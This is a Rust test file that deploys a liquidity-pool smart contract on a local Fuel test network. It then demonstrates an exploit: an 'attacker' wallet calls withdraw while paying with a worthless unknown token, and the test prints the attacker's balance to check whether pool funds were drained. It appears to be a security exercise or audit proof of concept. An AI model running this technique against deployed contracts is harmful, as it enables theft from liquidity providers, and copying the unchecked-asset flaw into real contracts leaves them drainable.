use fuels::{
    accounts::wallet, crypto::SecretKey, prelude::*, types::{AssetId, Bits256, Bytes32, ContractId, SizedAsciiString}
};

use rand::Rng;
use std::str::FromStr;
use sha2::{Digest, Sha256};
// Load abi from json
abigen!(Contract(
    name = "LiquidityPool",
    abi = "out/debug/liquidity-pool-abi.json"
));

async fn get_contract_instance() -> (LiquidityPool<WalletUnlocked>, WalletUnlocked, WalletUnlocked, ContractId, AssetId, AssetId) {

    let base_asset_id: AssetId =
    "0x9ae5b658754e096e4d681c548daf46354495a437cc61492599e33fc64dcdc30c".parse().unwrap();

    let unknown_asset_id = AssetId::from([2u8; 32]);

 
    let asset_ids = [AssetId::zeroed(), base_asset_id.clone(), unknown_asset_id.clone()];
    let asset_configs = asset_ids
         .map(|id| AssetConfig {
             id,
             num_coins: 1,
             coin_amount: 2_000_000,
           })
        .into();
 
    let wallet_config = WalletsConfig::new_multiple_assets(2, asset_configs);
    let wallets = launch_custom_provider_and_get_wallets(wallet_config, None, None).await.unwrap();

    let wallet_user = wallets[0].clone();
    let wallet_attacker = wallets[1].clone();

    let wallet = &wallets[0].clone();
 


    let contract_id = Contract::load_from(
        "out/debug/liquidity-pool.bin",
        LoadConfiguration::default(),
    ).unwrap()
    .deploy(wallet, TxPolicies::default())
    .await.unwrap();
     
    let contract_instance = LiquidityPool::new(contract_id.clone(), wallet.clone());


    (contract_instance, wallet_user, wallet_attacker, contract_id.into(), base_asset_id, unknown_asset_id)
}

pub fn get_asset_id(sub_id: Bytes32, contract: ContractId) -> AssetId {
    let mut hasher = Sha256::new();
    hasher.update(*contract);
    hasher.update(*sub_id);
    AssetId::new(*Bytes32::from(<[u8; 32]>::from(hasher.finalize())))
}

pub fn get_default_asset_id(contract: ContractId) -> AssetId {
    let default_sub_id = Bytes32::from([0u8; 32]);
    get_asset_id(default_sub_id, contract)
}


#[tokio::test]
async fn can_get_contract_id() {
    // firstly we lauch provider, wallets, and the liquidity_pool instance
    let (liquidity_pool_instance, 
        wallet_user,
        wallet_attacker,
        contract_id,
        base_asset_id,
        unknown_coin
        ) = get_contract_instance().await;


        // first test chect user balance of base asset

        let base_bal = wallet_user.get_asset_balance(&base_asset_id).await.unwrap();
        println!("Balance of user: {:#?}", base_bal);


        //now lets call the deposit function to deposit liquidity into the pool for user one

        // we have to first set the call params
        let deposit_amt = 1_000_000;

        let call_params = CallParameters::default()
            .with_amount(deposit_amt)
            .with_asset_id(base_asset_id);

       let liquidity_pool_asset_id = get_default_asset_id(contract_id.clone());
       // now lets call the contract 
       let bal_user = wallet_user.clone().get_asset_balance(&liquidity_pool_asset_id).await.unwrap();

       println!("Bal before of pool: {:#?}", bal_user);

       liquidity_pool_instance.methods()
                              .deposit(wallet_user.clone().address().into())
                              .call_params(call_params).unwrap()
                              .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
                              .call()
                              .await.unwrap();


        // now we get the asset id of the token minted for the liquidity pool and log the bal of user wallet

        let bal_user = wallet_user.clone().get_asset_balance(&liquidity_pool_asset_id).await.unwrap();

        println!("Bal after of pool: {:#?}", bal_user);

        // now lets create an instance with the already deployed pool so attacker can call it 

        let pool_instance = LiquidityPool::new(contract_id, wallet_attacker.clone());

        // lets check the balance for i've forgotten we will come back later


        /* 
           now we've set up the instance for the attacker to call this is where we check if the the exploit happens
           we first setup the call_params
        */

        let balance_before_attack = wallet_attacker.clone().get_asset_balance(&base_asset_id).await.unwrap();
        println!("Balance  before  of attacker: {:#?}", balance_before_attack);


        let deposit_amt_for_useless_tokens = 2_000_000;

        let params = CallParameters::default()
                                        .with_amount(deposit_amt_for_useless_tokens)
                                        .with_asset_id(unknown_coin);

        pool_instance.methods()
                       .withdraw(wallet_attacker.clone().address().into())
                       .call_params(params).unwrap()
                       .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
                       .call()
                       .await
                       .unwrap();


        // // now we check balance of attacker after the attacker


        let balance_after_attack = wallet_attacker.clone().get_asset_balance(&base_asset_id).await.unwrap();
        println!("Balance after of  attacker: {:#?}", balance_after_attack);

}


